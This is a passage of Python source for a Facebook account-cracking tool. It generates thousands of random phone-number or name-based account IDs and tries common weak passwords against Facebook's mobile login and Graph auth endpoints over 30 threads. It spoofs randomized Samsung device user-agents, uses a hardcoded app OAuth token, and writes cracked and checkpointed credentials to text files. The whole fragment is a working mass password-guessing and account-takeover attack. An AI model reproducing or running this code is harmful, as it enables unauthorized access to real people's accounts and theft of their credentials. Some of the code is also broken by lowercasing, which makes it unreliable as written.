l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")
#
def bd():
                user=[]
                pcp=[]
                clear()
                pcp.append(f'y')
                print('\033[1;32m code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except valueerror:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(' total account : \033[1;32m'+tl)
                        print(f'\033[1;37m choice code ..:\033[1;32m '+code)
                        print(f'\033[1;32m random version ..... ')
                        print(f'\033[1;37m \x1b[38;5;126m prosess started\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'bangladesh','i love you','@#@#@#','123890']
                                sat.submit(apix,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' the process has completed')
                print(' total successful/checkpoint: '+str(len(oks))+'/'+str(len(cps)))

def gml():
                user=[]
                pcp=[]
                clear()
                pcp.append(f'y')
                print('\033[1;32m name  example:  shahin, axel, formatkomamamo ')
                code = input(' first name : ')
                print(' name example : alam, hossen, hossain')
                codex = input(' last name : ')
                try:
                        limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except valueerror:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(2,5))
                        user.append(nmp)
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(' total account : \033[1;32m'+tl)
                        print(f'\033[1;37m choice code ..:\033[1;32m '+code)
                        print(f'\033[1;32m random version ..... ')
                        print(f'\033[1;37m \x1b[38;5;126m prosess has started please wait\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+codex+psx
                                passlist = [code,codex,code+codex,code+' '+codex,code+'123',code+'1234',code+'12345','@#@#@#','123890']
                                sat.submit(apix,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' the process has completed')
                print(' total successfull/checkpoint: '+str(len(oks))+'/'+str(len(cps)))





def rcrack_free(idf,pwv):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwv:
	#		print(idf+'|'+ps)
			#session = requests.session()
			sys.stdout.write(f'\r\r\033[1;37m [axe] %s|\033[1;32msuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.session()
			pro = random.choice(useragent)
			free_fb = session.get('https://m.alpha.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":idf,
			"pass":ps,
			"login":"log in"}
			header_freefb = {'authority': 'd.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-gb,en-us;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=obr6y3tm21fw7v9-6intj3am; sb=obr6y9l-3zpgwwzews_gjfqw; m_pixel_ratio=1.8000000715255737; wd=600x1114; fr=07gak6hnucjp9c1bl..bj-hqg.d6.aaa.0.0.bj-hre.awuh5u2bpxq',
    'sec-ch-ua': '"chromium";v="107", "not=a?brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[successful] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
				oks.append(idf)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[checkpoint] '+idf+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
				cps.append(idf)
				break
			else:
				continue
		loop+=1
		bo = random.choice([m,k,h,b,u,x])
		sys.stdout.write(f'\r\r\033[1;37m [axe] %s|\033[1;32msuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		sys.stdout.flush()
	
	except:
		pass
def apix(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [axe %s|\033[1;32msuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                xxxxx=(f"gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'davik/2.1.0 (linex; u; android {str(android_version)}.0.0; {str(gtt)} build/{str(gttt)} [fban/fb4a;fbav/{str(application_version)};fbbv/{str(application_version_code)};fbdm/'+'{density=2.0,width=720,height=1280};'+f'fblc/es_cu;fbrv/{str(application_version_code)};fbcr/movistar;fbmf/samsung;fbbd/samsung;fbpn/{str(fbs)};fbdv/{str(gtt)};fbsv/7.0;fbop/1;fbca/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source":"device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_cu","client_country_code":"cu",
                                        'device':gtt,
                                        "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                                        "method":"auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'authorization':'oauth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent': 'dalvik/2.1.0 linux; u; android 6.0.0; gt-i9300i build/ktu84p) [fban/fb4a;fbav/540.0.0.84.626;fbbv/169717250;fbdm/{density=4.0,width=1532,height=2560};fblc/en_us;fbcr/grameenphone;fbmf/samsung;fbbd/samsung;fbpn/com.facebook.katana;fbdv/gt-i9300i;fbsv/6.0.0;fbca/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'excellent',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=false).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [success] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/success.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/checkpoint.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.connectionerror:
                        time.sleep(10)
                except exception as e:
                        pass
		



spy()
￼enter
